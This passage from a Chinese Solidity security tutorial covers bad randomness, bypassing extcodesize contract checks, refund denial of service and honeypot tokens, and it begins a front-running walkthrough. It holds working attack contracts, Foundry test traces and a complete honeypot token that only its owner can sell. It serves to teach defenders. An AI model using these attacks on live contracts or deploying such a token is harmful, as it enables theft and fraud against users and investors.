<li>标准化实现</li>
</ul>
<p>2.EIP-712实现</p>
<ul>
<li>安全的签名标准</li>
<li>跨链兼容</li>
</ul>
<h1 id="S07-坏随机数"><a href="#S07-坏随机数" class="headerlink" title="S07. 坏随机数"></a>S07. 坏随机数</h1><p>智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。</p>
<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（<code>public</code>）且确定性（<code>deterministic</code>）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如<code>random()</code>。很多项目方不得不使用链上的伪随机数生成方法，例如 <code>blockhash()</code> 和 <code>keccak256()</code> 方法。</p>
<p>坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有<code>NFT</code>而非随机抽取。更多的内容可以阅读 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random">WTF Solidity极简教程 第39讲：伪随机数</a>。</p>
<h2 id="坏随机数案例"><a href="#坏随机数案例" class="headerlink" title="坏随机数案例"></a>坏随机数案例</h2><p>下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract BadRandomness is ERC721 &#123;<br>    uint256 totalSupply;<br><br>    // 构造函数，初始化NFT合集的名称、代号<br>    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;<br><br>    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint<br>    function luckyMint(uint256 luckyNumber) external &#123;<br>        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number<br>        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);<br><br>        _mint(msg.sender, totalSupply); // mint<br>        totalSupply++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>它有一个主要的铸造函数 <code>luckyMint()</code>，用户调用时输入一个 <code>0-99</code> 的数字，如果和链上生成的伪随机数 <code>randomNumber</code> 相等，即可铸造幸运 NFT。伪随机数使用 <code>blockhash</code> 和 <code>block.timestamp</code> 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。</p>
<p>下面我们写个攻击合约 <code>Attack.sol</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    function attackMint(BadRandomness nftAddr) external &#123;<br>        // 提前计算随机数<br>        uint256 luckyNumber = uint256(<br>            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))<br>        ) % 100;<br>        // 利用 luckyNumber 攻击<br>        nftAddr.luckyMint(luckyNumber);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>攻击函数 <code>attackMint()</code>中的参数为 <code>BadRandomness</code>合约地址。在其中，我们计算了随机数 <code>luckyNumber</code>，然后将它作为参数输入到 <code>luckyMint()</code> 函数完成攻击。由于<code>attackMint()</code>和<code>luckyMint()</code>将在同一个区块中调用，<code>blockhash</code>和<code>block.timestamp</code>是相同的，利用他们生成的随机数也相同。</p>
<h1 id="S08-绕过合约长度检查"><a href="#S08-绕过合约长度检查" class="headerlink" title="S08. 绕过合约长度检查"></a>S08. 绕过合约长度检查</h1><p>有一些项目为了限制程序员，会用到isContract()方法来校验msg.sender限制为外部账户(EOA)，而非合约地址</p>
<p>这个函数利用的是<code>extcodesize</code>获取改地址所存储的bytecode长度(runtime)，如果大于0，这判断为合约，否则就是EOA（用户）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用 extcodesize 检查是否为合约<br>function isContract(address account) public view returns (bool) &#123;<br>    // extcodesize &gt; 0 的地址一定是合约地址<br>    // 但是合约在构造函数时候 extcodesize 为0<br>    uint size;<br>    assembly &#123;<br>        size := extcodesize(account)<br>    &#125;<br>    return size &gt; 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里有一个漏洞，就是在合约在被创建的时候，<code>runtime bytecode</code> 还没有被存储到地址上，因此 <code>bytecode</code> 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 <code>constructor</code> 中的话，就可以绕过 <code>isContract()</code> 检查。</p>
<p><img src="/img/web3/S08-1.png" srcset="/img/loading.gif" lazyload alt="S08-1"></p>
<h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们来看一个例子：<code>ContractCheck</code>合约是一个 freemint ERC20 合约，铸造函数 <code>mint()</code> 中使用了 <code>isContract()</code> 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 <code>mint()</code> 可以铸造 100 枚代币。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用extcodesize检查是否为合约地址<br>contract ContractCheck is ERC20 &#123;<br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125;<br>    <br>    // 利用 extcodesize 检查是否为合约<br>    function isContract(address account) public view returns (bool) &#123;<br>        // extcodesize &gt; 0 的地址一定是合约地址<br>        // 但是合约在构造函数时候 extcodesize 为0<br>        uint size;<br>        assembly &#123;<br>            size := extcodesize(account)<br>        &#125;<br>        return size &gt; 0;<br>    &#125;<br><br>    // mint函数，只有非合约地址能调用（有漏洞）<br>    function mint() public &#123;<br>        require(!isContract(msg.sender), &quot;Contract not allowed!&quot;);<br>        _mint(msg.sender, 100);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>我们写一个攻击合约，在 <code>constructor</code> 中多次调用 <code>ContractCheck</code> 合约中的 <code>mint()</code> 函数，批量铸造 <code>1000</code> 枚代币：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用构造函数的特点攻击<br>contract NotContract &#123;<br>    bool public isContract;<br>    address public contractCheck;<br><br>    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。<br>    constructor(address addr) &#123;<br>        contractCheck = addr;<br>        isContract = ContractCheck(addr).isContract(address(this));<br>        // This will work<br>        for(uint i; i &lt; 10; i++)&#123;<br>            ContractCheck(addr).mint();<br>        &#125;<br>    &#125;<br><br>    // 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测<br>    function mint() external &#123;<br>        ContractCheck(contractCheck).mint();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>如果我们之前讲的是正确的话，在构造函数调用 <code>mint()</code> 可以绕过 <code>isContract()</code> 的检查成功铸造代币，那么函数将成功部署，并且状态变量 <code>isContract</code> 会在构造函数赋值 <code>false</code>。而在合约部署之后，<code>runtime bytecode</code> 已经被存储在合约地址上了，<code>extcodesize &gt; 0</code>， <code>isContract()</code> 能够成功阻止铸造，调用 <code>mint()</code> 函数将失败。</p>
<h2 id="预防办法-3"><a href="#预防办法-3" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用 <code>(tx.origin == msg.sender)</code> 来检测调用者是否为合约。如果调用者为 EOA，那么<code>tx.origin</code>和<code>msg.sender</code>相等；如果它们俩不相等，调用者为合约。在<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-3074">eip-3074</a>中，这样检查合约的方式，会失效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function realContract(address account) public view returns (bool) &#123;<br>    return (tx.origin == msg.sender);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了合约长度检查可以被绕过的漏洞，并介绍预防的方法。如果一个地址的 <code>extcodesize &gt; 0</code>，则该地址一定为合约；但如果 <code>extcodesize = 0</code>，该地址既可能为 <code>EOA</code>，也可能为正在创建状态的合约。</p>
<h1 id="S09-拒绝服务"><a href="#S09-拒绝服务" class="headerlink" title="S09. 拒绝服务"></a>S09. 拒绝服务</h1><p>在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。</p>
<p>在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction">荷兰拍卖</a>进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。</p>
<p><img src="/img/web3/S09-1.png" srcset="/img/loading.gif" lazyload alt="S09-1"></p>
<h2 id="漏洞例子-1"><a href="#漏洞例子-1" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们学习一个简化了的 Akutar 合约，名字叫 <code>DoSGame</code>。这个合约逻辑很简单，游戏开始时，玩家们调用 <code>deposit()</code> 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，<code>refund()</code>函数被调用，将 ETH 依次退款给所有玩家。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。<br>contract DoSGame &#123;<br>    bool public refundFinished;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    address[] public players;<br><br>    // 所有玩家存ETH到合约里<br>    function deposit() external payable &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);<br>        // 记录存款<br>        balanceOf[msg.sender] = msg.value;<br>        // 记录玩家地址<br>        players.push(msg.sender);<br>    &#125;<br><br>    // 游戏结束，退款开始，所有玩家将依次收到退款<br>    function refund() external &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        uint256 pLength = players.length;<br>        // 通过循环给所有玩家退款<br>        for(uint256 i; i &lt; pLength; i++)&#123;<br>            address player = players[i];<br>            uint256 refundETH = balanceOf[player];<br>            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br>            require(success, &quot;Refund Fail!&quot;);<br>            balanceOf[player] = 0;<br>        &#125;<br>        refundFinished = true;<br>    &#125;<br><br>    function balance() external view returns(uint256)&#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>这里的漏洞在于，<code>refund()</code> 函数中利用循环退款的时候，是使用的 <code>call</code> 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br></code></pre></td></tr></table></figure>



<p>下面我们写个攻击合约， <code>attack()</code> 函数中将调用 <code>DoSGame</code> 合约的 <code>deposit()</code> 存款并参与游戏；<code>fallback()</code> 回调函数将回退所有向该合约发送<code>ETH</code>的交易，对<code>DoSGame</code> 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 退款时进行DoS攻击<br>    fallback() external payable&#123;<br>        revert(&quot;DoS Attack!&quot;);<br>    &#125;<br><br>    // 参与DoS游戏并存款<br>    function attack(address gameAddr) external payable &#123;<br>        DoSGame dos = DoSGame(gameAddr);<br>        dos.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试场景一：正常使用是否可以成功退款</p>
<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DoSGameAttackTest is Test &#123;<br>    DoSGame public doSGame;<br>    DoSGameAttack public doSGameAttack;<br>    address public user;<br>    function setUp() public &#123;<br>        doSGame = new DoSGame(); // 部署 DoSGame 合约<br>        // 创建测试用户<br>        user = makeAddr(&quot;testUser&quot;);<br>        // 给用户转账<br>        vm.deal(user, 10 * 1e18);<br>    &#125;<br>    function test_deposit() public &#123;<br>        vm.startPrank(user);<br>        uint256 Before = doSGame.balance();<br>        console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>        doSGame.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        uint256 After = doSGame.balance();<br>        console.log(&quot;doSGame.balance After is  &quot;, After);<br>        doSGame.refund(); // 成功退款<br>        uint256 End = doSGame.balance();<br>        console.log(&quot;doSGame.balance End is  &quot;, End);<br>        vm.stopPrank();<br>    &#125;&#125;<br></code></pre></td></tr></table></figure>

<p>正常场景的测试结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  doSGame.balance Before is   0<br>  doSGame.balance After is   3000000000000000000<br>  doSGame.balance End is   0<br><br>Traces:<br>  [123843] DoSGameAttackTest::test_deposit()<br>    ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>    │   └─ ← [Return]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 3000000000000000000 [3e18]<br>    ├─ [0] console::log(&quot;doSGame.balance After is  &quot;, 3000000000000000000 [3e18]) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [28477] DoSGame::refund()<br>    │   ├─ [0] testUser::fallback&#123;value: 3000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance End is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<p>测试场景二：攻击合约测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test_DoSGameAttack() public &#123;<br>    vm.startPrank(user);<br>    uint256 Before = doSGame.balance();<br>    console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>    doSGameAttack = new DoSGameAttack(); //实例化攻击合约<br>    doSGameAttack.attack&#123;value: 3 * 1e18&#125;(address(doSGame));<br>    doSGame.refund();<br>    uint256 After = doSGame.balance();<br>    console.log(&quot;doSGame.balance After is  &quot;, After);<br>    vm.stopPrank();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行结果：无法赎回，为什么呢？因为在攻击合约里面定义了fallback回调函数，里面抛出了一个revert导致回调失败，无法赎回</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[268726] DoSGameAttackTest::test_DoSGameAttack()<br>  ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>  │   └─ ← [Return]<br>  ├─ [378] DoSGame::balance() [staticcall]<br>  │   └─ ← [Return] 0<br>  ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>  │   └─ ← [Stop]<br>  ├─ [106751] → new DoSGameAttack@0xb8BE0Cc57897f40C22410548f33B2750cb01E14f<br>  │   └─ ← [Return] 533 bytes of code<br>  ├─ [76392] DoSGameAttack::attack&#123;value: 3000000000000000000&#125;(DoSGame: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])<br>  │   ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Stop]<br>  │   └─ ← [Stop]<br>  ├─ [8756] DoSGame::refund()<br>  │   ├─ [335] DoSGameAttack::fallback&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Revert] DoS Attack!<br>  │   └─ ← [Revert] Refund Fail!<br>  └─ ← [Revert] Refund Fail!<br></code></pre></td></tr></table></figure>

<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：</p>
<ol>
<li>外部合约的函数调用（例如 <code>call</code>）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 <code>require(success, &quot;Refund Fail!&quot;);</code> 去掉，退款在单个地址失败时仍能继续运行。</li>
<li>合约不会出乎意料的自毁。</li>
<li>合约不会进入无限循环。</li>
<li><code>require</code> 和 <code>assert</code> 的参数设定正确。</li>
<li>退款时，让用户从合约自行领取（pull），而非批量发送给用户(push)。</li>
<li>确保回调函数不会影响正常合约运行。</li>
<li>确保当合约的参与者（例如 <code>owner</code>）永远缺席时，合约的主要业务仍能顺利运行。</li>
</ol>
<h1 id="S10-貔貅"><a href="#S10-貔貅" class="headerlink" title="S10. 貔貅"></a>S10. 貔貅</h1><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pixiu">貔貅</a>是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。（英文习惯叫蜜罐代币 honeypot token）。</p>
<p>通常一个貔貅盘有如下的生命周期：</p>
<ol>
<li>恶意项目方部署貔貅代币合约。</li>
<li>宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。</li>
<li>项目方<code>rug pull</code>卷走资金</li>
</ol>
<p>介绍一个极简的ERC20代币貔貅合约<code>Pixiu</code>。在该合约中，只有合约拥有者可以在<code>uniswap</code>出售代币，其他地址不能。</p>
<p><code>Pixiu</code> 有一个状态变量<code>pair</code>，用于记录<code>uniswap</code>中 <code>Pixiu-ETH LP</code>的币对地址。它主要有三个函数：</p>
<ol>
<li>构造函数：初始化代币的名称和代号，并根据 <code>uniswap</code> 和 <code>create2</code> 的原理计算<code>LP</code>合约地址，具体内容可以参考 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/25_Create2/readme.md">WTF Solidity 第25讲: Create2</a>。这个地址会在 <code>_update()</code> 函数中用到。</li>
<li><code>mint()</code>：铸造函数，仅 <code>owner</code> 地址可以调用，用于铸造 <code>Pixiu</code> 代币。</li>
<li><code>_update()</code>：<code>ERC20</code>代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 <code>to</code> 为 <code>LP</code> 的时候，也就是韭菜卖出的时候，交易会 <code>revert</code>；只有调用者为<code>owner</code>的时候能够成功。这也是貔貅合约的核心。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 极简貔貅ERC20代币，只能买，不能卖<br>contract HoneyPot is ERC20, Ownable &#123;<br>    address public pair;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;HoneyPot&quot;, &quot;Pi Xiu&quot;) &#123;<br>        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory<br>        address tokenA = address(this); // 貔貅代币地址<br>        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序<br>        bytes32 salt = keccak256(abi.encodePacked(token0, token1));<br>        // calculate pair address<br>        pair = address(uint160(uint(keccak256(abi.encodePacked(<br>        hex&#x27;ff&#x27;,<br>        factory,<br>        salt,<br>        hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27;<br>        )))));<br>    &#125;<br>    <br>    /**<br>     * 铸造函数，只有合约所有者可以调用<br>     */<br>    function mint(address to, uint amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * @dev See &#123;ERC20-_update&#125;.<br>     * 貔貅函数：只有合约拥有者可以卖出<br>    */<br>    function _update(<br>      address from,<br>      address to,<br>      uint256 amount<br>  ) internal virtual override &#123;<br>     if(to == pair)&#123;<br>        require(from == owner(), &quot;Can not Transfer&quot;);<br>      &#125;<br>      super._update(from, to, amount);<br>  &#125;<br>  // 为什么是_update？<br>  // 注意override是重写，重写了父合约ERC20的_update<br>  // 而父合约ERC20的_update方法，就是更新所有人，就是转移，本来属于你的1个币转移给另一个人了，这就是update<br>  // 这里重写_update 当转移的to地址是pair地址时，触发校验，要求from必须是 owner，<br>  // 也就是说只有owner才可以向pair合约转账<br>  // 也就代表自由owner才可以向uniswap卖币<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="S11-抢先交易"><a href="#S11-抢先交易" class="headerlink" title="S11. 抢先交易"></a>S11. 抢先交易</h1><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p>
<p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些<code>MEV</code>机器人也会搜索<code>mempool</code>中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的<code>swap</code>交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。</p>
<p><img src="/img/web3/S11-1.png" srcset="/img/loading.gif" lazyload alt="S11-1"></p>
<h2 id="抢跑实践"><a href="#抢跑实践" class="headerlink" title="抢跑实践"></a>抢跑实践</h2><p>如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：</p>
<ul>
<li><code>Foundry</code>的<code>anvil</code>工具搭建本地测试链，请提前安装好 <a target="_blank" rel="noopener" href="https://book.getfoundry.sh/getting-started/installation">foundry</a>。</li>
<li><code>remix</code>进行NFT合约的部署和铸造</li>
<li><code>etherjs</code>脚本监听<code>mempool</code>并进行抢跑。</li>
</ul>
<p><strong>1. 启动Foundry本地测试链：</strong> 在安装好 <code>foundry</code> 之后，在命令行输入 <code>anvil --chain-id 1234 -b 10</code> 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。</p>
<p><strong>2. 将Remix连接到测试链：</strong> 打开 Remix 的部署页面，打开左上角的<code>Environment</code>下拉菜单，选<code>Foundry Provider</code>即可将 Remix 连接到测试链。</p>
